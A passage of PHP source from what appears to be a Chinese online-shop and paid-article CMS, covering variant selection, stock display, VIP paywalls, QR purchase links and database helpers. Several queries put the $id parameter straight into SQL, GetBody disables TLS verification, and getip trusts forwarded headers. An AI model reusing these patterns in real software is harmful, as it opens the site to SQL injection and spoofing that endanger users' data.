						\$(\"#buy input[type='submit']\").attr(\"value\",\"暂时缺货\");
					}else{
						\$(\"#buy button\").removeAttr(\"disabled\");
						\$(\"#buy #cart_btn\").html(\"加入购物车\");
						\$(\"#buy input[type='submit']\").removeAttr(\"disabled\");
						\$(\"#buy input[type='submit']\").attr(\"value\",\"立即购买\");
					}
				}
			 }); 
			\$(\"#buy div\").find(\"label:first\").addClass(\"checked\");
			\$(\"#buy div\").find(\"input:first\").attr(\"checked\",\"checked\");
			\$(\"#buy div\").find(\"label:first\").trigger(\"click\");
			})
			</script>
            <style>
            input[type='radio'] {display: none;}
            #buy label {line-height:150%;display:inline-block;margin-bottom:5px;padding:2px 10px;cursor: pointer;border: #ccc solid 2px;border-radius: 3px;color:#000;}
            #buy .checked {border: #f32196 solid 2px;border-radius: 3px;color: #fff;background:#f32196}
            #buy label .text{font-size:12px;text-align:center;padding-top:3px;margin:0 -10px;width:75px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
            #buy label img{width:75px;height:75px;margin:-2px -10px}
            </style>";
        $shuxing = explode("@", $P_gg);
        if ($P_gg != "") {
            for ($j = 0; $j < count($shuxing); $j++) {
                if ($shuxing[$j] != "__") {
                    $P_sc = $P_sc . "<div style=\"margin-bottom:5px;\"><div style=\"display:inline-block;width:50px;float:left\"><b>" . splitx($shuxing[$j], "_", 0) . "</b></div> <div style=\"display:inline-block;width:calc(100% - 50px)\">";
                    $P_sc2 = $P_sc2 . "<b>" . splitx($shuxing[$j], "_", 0) . "</b> ";
                    $sc = explode("|", splitx($shuxing[$j], "_", 1));
                    $pc = explode("|", splitx($shuxing[$j], "_", 3));
                    $gg_price = explode("|", splitx($shuxing[$j], "_", 2));
                    for ($i = 0; $i < count($sc); $i++) {
                        if ($P_ggsell != "") {
                            $gg_sell = explode("\n", $P_ggsell);
                            switch (splitx($gg_sell[$i], "|", 0)) {
                                case 0:
                                    $gg_rest = 999999999;
                                    $gg_rest_title = "充足";
                                    break;
                                case 1:
                                    $gg_rest = getrs("select count(C_id) as C_count from sl_card where C_use=0 and C_del=0 and C_sort=" . intval(splitx($gg_sell[$i], "|", 1)), "C_count");
                                    $gg_rest_title = getrs("select count(C_id) as C_count from sl_card where C_use=0 and C_del=0 and C_sort=" . intval(splitx($gg_sell[$i], "|", 1)), "C_count") . "件";
                                    break;
                                case 2:
                                    $gg_rest = $P_restx;
                                    $gg_rest_title = $P_restx . "件";
                                    break;
                            }
                        } else {
                            switch ($P_selltype) {
                                case 0:
                                    $gg_rest_title = "充足";
                                    $gg_rest = 999999999;
                                    break;

                                case 1:
                                    $gg_rest_title = getrs("select count(C_id) as C_count from sl_card where C_sort=" . intval($P_sell) . " and C_use=0 and C_del=0", "C_count") . "件";
                                    $gg_rest = getrs("select count(C_id) as C_count from sl_card where C_sort=" . intval($P_sell) . " and C_use=0 and C_del=0", "C_count");
                                    break;

                                case 2:
                                    $gg_rest_title = $P_restx . "件";
                                    $gg_rest = $P_restx;
                                    break;
                            }
                        }
                        if ($pc[$i] != "") {
                            if (isMobile()) {
                                $P_sc = $P_sc . "<label data-pic='media/" . $pc[$i] . "' data-title='" . $sc[$i] . "' data-rest='" . $gg_rest . "' data-restTitle='" . $gg_rest_title . "' data-price='" . p($gg_price[$i]) . "' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> <img src='media/" . $pc[$i] . "' title='" . $sc[$i] . "'><div class='text'>" . $sc[$i] . "</div></label> ";
                            } else {
                                $P_sc = $P_sc . "<label data-pic='media/" . $pc[$i] . "' data-title='" . $sc[$i] . "' data-rest='" . $gg_rest . "' data-restTitle='" . $gg_rest_title . "' data-price='" . p($gg_price[$i]) . "' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> <img src='media/" . $pc[$i] . "' style='width:38px;height:38px;margin:-1px -9px' title='" . $sc[$i] . "'></label> ";
                            }

                        } else {
                            $P_sc = $P_sc . "<label data-pic='' data-title='" . $sc[$i] . "' data-rest='" . $gg_rest . "' data-restTitle='" . $gg_rest_title . "' data-price='" . p($gg_price[$i]) . "' aa='scvvvvv_" . $j . "'><input type='radio' name='scvvvvv_" . $j . "' id='" . $j . "_" . $i . "' value='" . $i . "'> " . $sc[$i] . "</label> ";
                        }

                        $P_sc2 = $P_sc2 . $sc[$i] . " / ";
                    }
                    $P_sc = $P_sc . "</div></div>";
                    $P_sc2 = substr($P_sc2, 0, strlen($P_sc2) - 2);
                    $P_sc2 = $P_sc2 . "<br>";
                }
            }
        }

        $gg = $gg . $P_js . $P_sc;
        $t = str_Replace("[P_gg]", $gg, $t);
    }

    switch ($P_selltype) {
        case 0:
            $P_resttitle = "充足";
            $P_rest = 999999999;
            break;

        case 1:
            $P_resttitle = getrs("select count(C_id) as C_count from sl_card where C_sort=" . intval($P_sell) . " and C_use=0 and C_del=0", "C_count") . "件";
            $P_rest = getrs("select count(C_id) as C_count from sl_card where C_sort=" . intval($P_sell) . " and C_use=0 and C_del=0", "C_count");
            break;

        case 2:
            $P_resttitle = $P_restx . "件";
            $P_rest = $P_restx;
            break;
    }


    $sql = "select P_id,P_title from sl_product where P_id = (select P_id from sl_product where P_id < $id and P_del=0 order by P_id desc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["P_id"] == "") {
        $P_Ntitle = "没有了";
        $P_Nurl = "javascript:;";
    } else {
        $P_Ntitle = $row["P_title"];
        $P_Nurl = "?type=productinfo&id=" . $row["P_id"];
    }

    $sql = "select P_id,P_title from sl_product where P_id = (select P_id from sl_product where P_id > $id and P_del=0 order by P_id asc limit 1)";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if ($row["P_id"] == "") {
        $P_Ptitle = "没有了";
        $P_Purl = "javascript:;";
    } else {
        $P_Ptitle = $row["P_title"];
        $P_Purl = "?type=productinfo&id=" . $row["P_id"];
    }

    $t = str_Replace("[P_resttitle]", $P_resttitle, $t);
    $t = str_Replace("[P_rest]", $P_rest, $t);
    $t = str_Replace("[P_Ntitle]", $P_Ntitle, $t);
    $t = str_Replace("[P_Nurl]", $P_Nurl, $t);
    $t = str_Replace("[P_Ptitle]", $P_Ptitle, $t);
    $t = str_Replace("[P_Purl]", $P_Purl, $t);

    if ($_SESSION["M_id"] == "") {
        $fh_info = "";
    } else {
        if ($P_selltype == 0 || $P_selltype == 1) {
            $fh_info = "<div class=\"P_address\">[自动发货] 收件邮箱：" . getrs("select * from sl_member where M_id=" . $_SESSION["M_id"], "M_email") . " <a href=\"member/edit.php\" target=\"_balnk\">[编辑]</a></div>";
        } else {

            $sql = "select * from sl_address where A_del=0 and A_mid=" . $_SESSION["M_id"];
            $result = mysqli_query($conn, $sql);

            if (mysqli_num_rows($result) > 0) {
                while ($row = mysqli_fetch_assoc($result)) {
                    if ($row["A_default"] == 1) {
                        $d = "checked=\"checked\"";
                    } else {
                        $d = "";
                    }
                    $fh = $fh . "<p><label aa=\"A_address\"><input type=\"radio\" name=\"A_address\" value=\"" . $row["A_id"] . "\" " . $d . "> " . $row["A_address"] . " " . $row["A_name"] . " " . $row["A_phone"] . "</label></p>";
                }
                $fh_info = "<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[编辑]</a>：" . $fh . "  </div>";
            } else {
                $fh_info = "<div class=\"P_address\">选择收货地址 <a href=\"member/address.php\" target=\"_balnk\">[新增]</a>：<p><label aa=\"A_address\"><input value=\"0\" type=\"radio\" name=\"A_address\" checked=\"checked\">暂无，请点击新增</label></p> </div>";
            }
        }
    }
    $t = str_Replace("[fh_address]", "<style>.P_address{padding:10px;margin:10px 0;border:dashed 1px #DDDDDD;width:100%;border-radius:10px;box-shadow:0px 2px 10px #CCCCCC}</style>" . $fh_info, $t);
    return $t;
}

function buynews($color, $N_price, $id)
{
    global $conn, $C_n_discount, $C_n_discount2, $C_fx1, $C_fx2, $C_fx3;
    $genkey = date('YmdHis') . rand(100000, 999999) . rand(100000, 999999);
    $sql = "select * from sl_member where M_id=" . intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

        $M_viptime = $row["M_viptime"];
        $M_viplong = $row["M_viplong"];

        if ($M_viplong - (time() - strtotime($M_viptime)) / 86400 * 24 * 60 > 0) {
            $M_vip = 1;
            if ($M_viplong > 30000) {
                $discount = $C_n_discount2 / 10;
            } else {
                $discount = $C_n_discount / 10;
            }

            $fee = "<b style=\"color:" . $color . "\">" . round($N_price * $discount, 2) . "元</b>[<del>原价：" . $N_price . "元</del>]";
        } else {
            $M_vip = 0;
            $discount = 1;
            $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
        }
    } else {
        $M_vip = 0;
        $discount = 1;
        $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
    }
    $N = getrs("select * from sl_news where N_id=" . $id);

    $N_long = $N["N_long"];
    $N_date = $N["N_date"];
    $N_uncopy = $N["N_uncopy"];
    $N_fx = $N["N_fx"];
    $N_viponly = $N["N_viponly"];
    if ($N_long > 0) {
        $N_longinfo = "<br>[限时收费]本文章将在<span style=\"color:$color\">" . date("Y-m-d H:i:s", strtotime("+$N_long hour", strtotime($N_date))) . "</span>后免费开放阅读";
    } else {
        $N_longinfo = "";
    }
    $api = $api . "
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px " . $color . ";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:" . $color . ";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px " . $color . ";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:" . $color . " !important;background:#ffffff;border:solid 1px " . $color . ";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
    $api = $api . "<form action=\"buy.php?type=newsinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";


    if ($N_viponly == 1 && $M_vip == 0) {
        $api = $api . "<div>本文章为付费文章，是否<b style=\"color:" . $color . "\">开通VIP</b>后完整阅读？</div>";
    } else {
        $api = $api . "<div>本文章为付费文章，是否<b style=\"color:" . $color . "\">开通VIP</b>后完整阅读？</div>";
    }

    $api = $api . "<p style=\"font-size:12px;color:#AAAAAA\">如果您已经成为VIP，<a href=\"member/login.php?from=" . urlencode("../?type=newsinfo&id=$id") . "\">[登录帐号]</a>后即可查看" . $N_longinfo . "</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";

    if ($N_viponly == 1 && $M_vip == 0) {
        $api = $api . "<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/vip.php'\" type=\"button\">开通VIP后查看</button>";
    } else {
        $api = $api . "<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/vip.php'\" type=\"button\">开通VIP后查看</button>";
    }

    $api = $api . "</div>
        </div>
        </form>";
    if (!isMobile()) {
        $api = $api . "<script src=\"js/qrcode.min.js\"></script>
		<script>
		var qrcode = new QRCode('billImage', {width: 100,height: 100,colorDark: '#000000',colorLight: '#ffffff',correctLevel: QRCode.CorrectLevel.H});
		qrcode.makeCode(\"" . gethttp() . splitx($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'], "index.php", 0) . "member/unlogin.php?type=news&id=$id&genkey=$genkey\");
		</script>";
    }
    $api = $api . "<script>
function getQueryVariable(variable){
       var query = window.location.search.substring(1);
       var vars = query.split(\"&\");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split(\"=\");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}
function news_post(){
	\$.post(\"conn/f.php?action=checknewsbuy&id=$id\",
    {
      genkey:getQueryVariable(\"genkey\"),
    },
  function(data){
  	data = JSON.parse(data);
	  if(data.code==\"success\"){
	  	\$(\"#N_tx\").html(data.msg);
	  }
    });
}
setTimeout(\"news_post()\",500);
</script>";
    if ($N_uncopy == 1) {
        $api = $api . "<script language=\"Javascript\">  
		document.oncontextmenu=new Function(\"event.returnValue=false\");  
		document.onselectstart=new Function(\"event.returnValue=false\");  
		</script>";
    }
    return $api;
}

function buywenzhang($color, $N_price, $id)
{
    global $conn, $C_n_discount, $C_n_discount2, $C_fx1, $C_fx2, $C_fx3;
    $genkey = date('YmdHis') . rand(100000, 999999) . rand(100000, 999999);
    $sql = "select * from sl_member where M_id=" . intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

        $M_viptime = $row["M_viptime"];
        $M_viplong = $row["M_viplong"];

        if ($M_viplong - (time() - strtotime($M_viptime)) / 86400 * 24 * 60 > 0) {
            $M_vip = 1;
            if ($M_viplong > 30000) {
                $discount = $C_n_discount2 / 10;
            } else {
                $discount = $C_n_discount / 10;
            }

            $fee = "<b style=\"color:" . $color . "\">" . round($N_price * $discount, 2) . "元</b>[<del>原价：" . $N_price . "元</del>]";
        } else {
            $M_vip = 0;
            $discount = 1;
            $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
        }
    } else {
        $M_vip = 0;
        $discount = 1;
        $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
    }
    $N = getrs("select * from sl_news where N_id=" . $id);

    $N_long = $N["N_long"];
    $N_date = $N["N_date"];
    $N_uncopy = $N["N_uncopy"];
    $N_fx = $N["N_fx"];
    $N_viponly = $N["N_viponly"];
    if ($N_long > 0) {
        $N_longinfo = "<br>[限时收费]本文章将在<span style=\"color:$color\">" . date("Y-m-d H:i:s", strtotime("+$N_long hour", strtotime($N_date))) . "</span>后免费开放阅读";
    } else {
        $N_longinfo = "";
    }
    $api = $api . "
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px " . $color . ";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:" . $color . ";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px " . $color . ";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:" . $color . " !important;background:#ffffff;border:solid 1px " . $color . ";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
    $api = $api . "<form action=\"buy.php?type=newsinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";


    if ($N_viponly == 1 && $M_vip == 0) {
        $api = $api . "<div>本文章为付费文章，是否<b style=\"color:" . $color . "\">购买</b>后完整阅读？</div>";
    } else {
        $api = $api . "<div>本文章为付费文章，是否<b style=\"color:" . $color . "\">购买</b>后完整阅读？</div>";
    }

    $api = $api . "<p style=\"font-size:12px;color:#AAAAAA\">如果您已经购买，<a href=\"member/login.php?from=" . urlencode("../?type=newsinfo&id=$id") . "\">[登录帐号]</a>后即可查看" . $N_longinfo . "</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";

    if ($N_viponly == 1 && $M_vip == 0) {
        $api = $api . "<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/wenzhangbuy.php?type=newsinfo&id=$id'\" type=\"button\">购买后查看</button>";
    } else {
        $api = $api . "<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/wenzhangbuy.php?type=newsinfo&id=$id'\" type=\"button\">购买后查看</button>";
    }

    $api = $api . "</div>
        </div>
        </form>";
    if (!isMobile()) {
        $api = $api . "<script src=\"js/qrcode.min.js\"></script>
		<script>
		var qrcode = new QRCode('billImage', {width: 100,height: 100,colorDark: '#000000',colorLight: '#ffffff',correctLevel: QRCode.CorrectLevel.H});
		qrcode.makeCode(\"" . gethttp() . splitx($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'], "index.php", 0) . "member/unlogin.php?type=news&id=$id&genkey=$genkey\");
		</script>";
    }
    $api = $api . "<script>
function getQueryVariable(variable){
       var query = window.location.search.substring(1);
       var vars = query.split(\"&\");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split(\"=\");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}
function news_post(){
	\$.post(\"conn/f.php?action=checknewsbuy&id=$id\",
    {
      genkey:getQueryVariable(\"genkey\"),
    },
  function(data){
  	data = JSON.parse(data);
	  if(data.code==\"success\"){
	  	\$(\"#N_tx\").html(data.msg);
	  }
    });
}
setTimeout(\"news_post()\",500);
</script>";
    if ($N_uncopy == 1) {
        $api = $api . "<script language=\"Javascript\">  
		document.oncontextmenu=new Function(\"event.returnValue=false\");  
		document.onselectstart=new Function(\"event.returnValue=false\");  
		</script>";
    }
    return $api;
}


function buyshipin($color, $N_price, $id)
{
    global $conn, $C_n_discount, $C_n_discount2, $C_fx1, $C_fx2, $C_fx3;
    $genkey = date('YmdHis') . rand(100000, 999999) . rand(100000, 999999);
    $sql = "select * from sl_member where M_id=" . intval($_SESSION["M_id"]);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {

        $M_viptime = $row["M_viptime"];
        $M_viplong = $row["M_viplong"];

        if ($M_viplong - (time() - strtotime($M_viptime)) / 86400 * 24 * 60 > 0) {
            $M_vip = 1;
            if ($M_viplong > 30000) {
                $discount = $C_n_discount2 / 10;
            } else {
                $discount = $C_n_discount / 10;
            }

            $fee = "<b style=\"color:" . $color . "\">" . round($N_price * $discount, 2) . "元</b>[<del>原价：" . $N_price . "元</del>]";
        } else {
            $M_vip = 0;
            $discount = 1;
            $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
        }
    } else {
        $M_vip = 0;
        $discount = 1;
        $fee = "<b style=\"color:" . $color . "\">" . $N_price . "元</b>";
    }
    $N = getrs("select * from sl_videos where V_id=" . $id);

    $N_date = $N["N_date"];
    
    $api = $api . "
  <style>
  .fh100_news_box{text-align:center;width:clac(100% - 40px);max-width:600px;margin:0 auto;border-radius:10px;border:dashed 1px " . $color . ";padding:20px;box-shadow:0px 2px 10px #CCCCCC;font-size:15px}
  .fh100_news_btn{color:#ffffff !important;background:" . $color . ";display:inline-block;margin-top:10px;border-radius:10px;border:solid 1px " . $color . ";padding:0 10px;font-size:15px}
  .fh100_news_btn:hover{color:" . $color . " !important;background:#ffffff;border:solid 1px " . $color . ";}
  .fh100_qr_buy{display:inline-block;vertical-align:top;width:100px;margin-right:15px;}
  .fh100_qr_buy div{font-size:12px;}
  .fh100_news_buy{display:inline-block}
  .fh100_news_buy a{text-align:center}
  </style>";
    $api = $api . "<form action=\"buy.php?type=videosinfo&id=$id\" method=\"post\">
        <div class=\"fh100_news_box\">";


    $api = $api . "<div>本视频为付费视频，是否<b style=\"color:" . $color . "\">购买</b>后完整观看？</div>";

    $api = $api . "<p style=\"font-size:12px;color:#AAAAAA\">如果您已经购买，<a href=\"member/login.php?from=" . urlencode("../?type=videosinfo&id=$id") . "\">[登录帐号]</a>后即可查看" . $N_longinfo . "</p>
        <input type=\"hidden\" name=\"genkey\" value=\"$genkey\">";

    $api = $api . "<button class=\"fh100_news_btn\" onclick=\"window.location.href='member/shipinbuy.php?type=videosinfo&id=$id'\" type=\"button\">购买后查看</button>";

    $api = $api . "</div>
        </div>
        </form>";
    
    return $api;
}


function unlogin_product($class, $id, $genkey = 'a')
{
    global $conn, $C_fx1, $C_fx2, $C_fx3;
    if ($genkey == "a") {
        $genkey = date('YmdHis') . rand(1000, 9999);
    }

    $sql = "select * from sl_product where P_id=" . intval($id);
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    $P_id = p($row["P_id"]);
    $P_price = p($row["P_price"]);
    $P_unlogin = $row["P_unlogin"];
    $P_fx = $row["P_fx"];
    $P_taobao = $row["P_taobao"];
    $P_code = $row["P_code"];

    if ($P_code != "") {
        $unlogin = $unlogin . " <div style=\"display:inline-block;vertical-align:top;\" id=\"P_code\"><button class=\"$class\" onclick=\"code()\" type=\"button\">免费兑换</button></div>";
    }

    $unlogin = $unlogin . " <button class=\"$class\" onclick=\"addcart()\" type=\"button\" id=\"cart_btn\">加入购物车</button>";

    if (splitx($P_taobao, "|", 1) != "") {
        $unlogin = $unlogin . " <a class=\"$class\" href=\"" . splitx($P_taobao, "|", 1) . "\" target=\"_blank\">演示地址</a>";
    }

    $info = $unlogin . "<input type=\"hidden\" name=\"genkey\" value=\"$genkey\">
	<script>
	function code(){
		$(\"#P_code\").html(\"<input type='text' name='P_code' id='duihuan' placeholder='兑换码' style='border:none;border-bottom:solid 1px #DDDDDD;vertical-align:bottom;height:30px;outline: none;'><button class='$class' onclick='getp()' type='button'>兑换</button>\");
	}
	function getp(){
		$.ajax({
		        type: \"POST\",
		        url: \"conn/f.php?action=getp&id=$P_id\",
		        data: $(\"#buy\").serialize(),
		        success:function(d){
		            if(d==\"success\"){
		              window.location.href=\"member/unlogin.php?genkey=$genkey\";
		            }else{
		              alert(d);
		            }
		       }
		     });
	}
	</script>
	";
    if (splitx($P_taobao, "|", 0) == "") {
        return $info;
    } else {
        return "<div style=\"display:inline-block;font-size:12px;vertical-align:bottom\">说明：将会跳转到<a href=\"" . splitx($P_taobao, "|", 0) . "\" target=\"_blank\">外部链接</a>购买</div>";
    }
}

function unlogin_product_qr($id, $genkey = 'a')
{
    if ($genkey == "a") {
        $genkey = date('YmdHis') . rand(1000, 9999);
    }
    $info = "https://static.websiteonline.cn/website/qr/index.php?url=" . urlencode(gethttp() . splitx($_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'], "index.php", 0) . "member/unlogin.php?type=product&id=" . $id . "&genkey=" . $genkey);
    return $info;
}

function getrs($sqlx, $valuex = "")
{
    global $conn;
    $resultx = mysqli_query($conn, $sqlx);
    $rowx = mysqli_fetch_assoc($resultx);
    if (mysqli_num_rows($resultx) > 0) {
        if ($valuex == "") {
            return $rowx;
        } else {
            return $rowx[$valuex];
        }
    } else {
        return "";
    }
}

function getlist($sql)
{
    global $conn;
    $result = mysqli_query($conn, $sql);
    $arr = array();
    while ($row = mysqli_fetch_array($result)) {
        $count = count($row);
        for ($i = 0; $i < $count; $i++) {
            unset($row[$i]);
        }
        array_push($arr, $row);
    }
    return $arr;
}

function gen_key($length, $type = 1)
{
    switch ($type) {
        case 1:
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            break;
        case 2:
            $chars = '0123456789';
            break;
        case 3:
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            break;
        case 4:
            $chars = 'abcdefghijklmnopqrstuvwxyz';
            break;
        default:
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    }

    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    return $password;
}

function diffBetweenTwoDays($day1, $day2)
{
    $second1 = strtotime($day1);
    $second2 = strtotime($day2);

    return round(($second2 - $second1) / 86400, 0);
}

function splitx($a, $b, $c)
{
    $d = explode($b, $a);
    return $d[$c];
}

function GetBody($url, $xml, $method = 'POST')
{
    $second = 30;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_TIMEOUT, $second);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    $data = curl_exec($ch);
    if ($data) {
        curl_close($ch);
        return $data;
    } else {
        $error = curl_errno($ch);
        curl_close($ch);
        return false;
    }
}

function isMobile()
{
    if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
        return true;
    }
    if (isset($_SERVER['HTTP_VIA'])) {
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    }
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $clientkeywords = array('nokia', 'sony', 'ericsson', 'mot', 'samsung', 'htc', 'sgh', 'lg', 'sharp', 'sie-', 'philips', 'panasonic', 'alcatel', 'lenovo', 'iphone', 'ipod', 'blackberry', 'meizu', 'android', 'netfront', 'symbian', 'ucweb', 'windowsce', 'palm', 'operamini', 'operamobi', 'openwave', 'nexusone', 'cldc', 'midp', 'wap', 'mobile');
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
            return true;
        }
    }

    if (isset ($_SERVER['HTTP_ACCEPT'])) {
        if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
            return true;
        }
    }
    return false;
}

function isWeixin()
{
    if (strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') !== false) {
        return true;
    } else {
        return false;
    }
}

function getip()
{
    static $realip;
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $realip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else if (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $realip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $realip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv("HTTP_X_FORWARDED_FOR")) {
            $realip = getenv("HTTP_X_FORWARDED_FOR");
        } else if (getenv("HTTP_CLIENT_IP")) {
            $realip = getenv("HTTP_CLIENT_IP");
        } else {
            $realip = getenv("REMOTE_ADDR");
        }
    }
    return $realip;
}

function DateAdd($part, $n, $date, $type = "Y-m-d")
{
    switch ($part) {
        case "y":
            $val = date($type, strtotime($date . " +$n year"));
            break;
        case "m":
            $val = date($type, strtotime($date . " +$n month"));
            break;
        case "w":
            $val = date($type, strtotime($date . " +$n week"));
            break;
        case "d":
            $val = date($type, strtotime($date . " +$n day"));
            break;
        case "h":
            $val = date($type, strtotime($date . " +$n hour"));
            break;
        case "n":
            $val = date($type, strtotime($date . " +$n minute"));
            break;
        case "s":
            $val = date($type, strtotime($date . " +$n second"));
            break;
    }
    return $val;
}

function box($B_text, $B_url, $B_type)
{
    if ($B_url == "back") {
        echo "<script>alert('" . $B_text . "');history.back();</script>";
    } else {
        echo "<script>alert('" . $B_text . "');window.location.href='" . $B_url . "';</script>";
    }
    die();
}

function geturl()
{
    return gethttp() . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
}

function CopyMyFolder($source, $dest)
{
    if (!file_exists($dest)) mkdir($dest);
    $handle = opendir($source);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_source = $source . '/' . $item;
        $_dest = $dest . '/' . $item;
        if (is_file($_source)) copy($_source, $_dest);
        if (is_dir($_source)) CopyMyFolder($_source, $_dest);
    }
    closedir($handle);
}


function DeleteFolder($path)
{
    $handle = opendir($path);
    while (($item = readdir($handle)) !== false) {
        if ($item == '.' || $item == '..') continue;
        $_path = $path . '/' . $item;
        if (is_file($_path)) unlink($_path);
        if (is_dir($_path)) DeleteFolder($_path);
    }
    closedir($handle);
    return rmdir($path);
}

function t($str)
{
    global $conn;
    return mysqli_real_escape_string($conn, $str);
}

function CheckFields($myTable, $myFields)
{
    global $conn;
    $field = mysqli_query($conn, "Describe " . $myTable . " " . $myFields);
    $field = mysqli_fetch_array($field);
    if ($field[0]) {
        return 1;
    } else {
        return 0;
    }
}

function CheckTables($myTable)
{
    global $conn;
    $field = mysqli_query($conn, "SHOW TABLES LIKE '" . $myTable . "'");
    $field = mysqli_fetch_array($field);
    if ($field[0]) {
        return 1;
    } else {
        return 0;
    }
}

function enname($name)
{
    if ($name == "未登录帐号") {
        return "免登录购买";
    } else {
        return mb_substr($name, 0, 1, "utf-8") . "***";
    }

}

function xcode($string, $operation = 'DECODE', $key = '', $expiry = 0)
{
    $ckey_length = 4;
    $key = md5($key ? $key : $GLOBALS['discuz_auth_key']);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya . md5($keya . $keyc);
    $key_length = strlen($cryptkey);
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for ($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
